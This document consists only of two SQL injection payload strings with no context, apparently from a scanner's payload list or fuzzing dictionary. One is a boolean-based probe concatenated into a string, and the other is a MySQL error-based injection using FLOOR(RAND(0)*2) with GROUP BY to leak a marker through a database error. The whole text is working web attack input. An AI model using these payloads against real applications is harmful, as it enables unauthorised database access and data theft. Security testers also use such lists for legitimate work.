'||(SELECT 'v' + 'u' + 'n' WHERE 1=1 OR NOT 1=1 )||'

'||(SELECT 0x76756e WHERE 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )||'
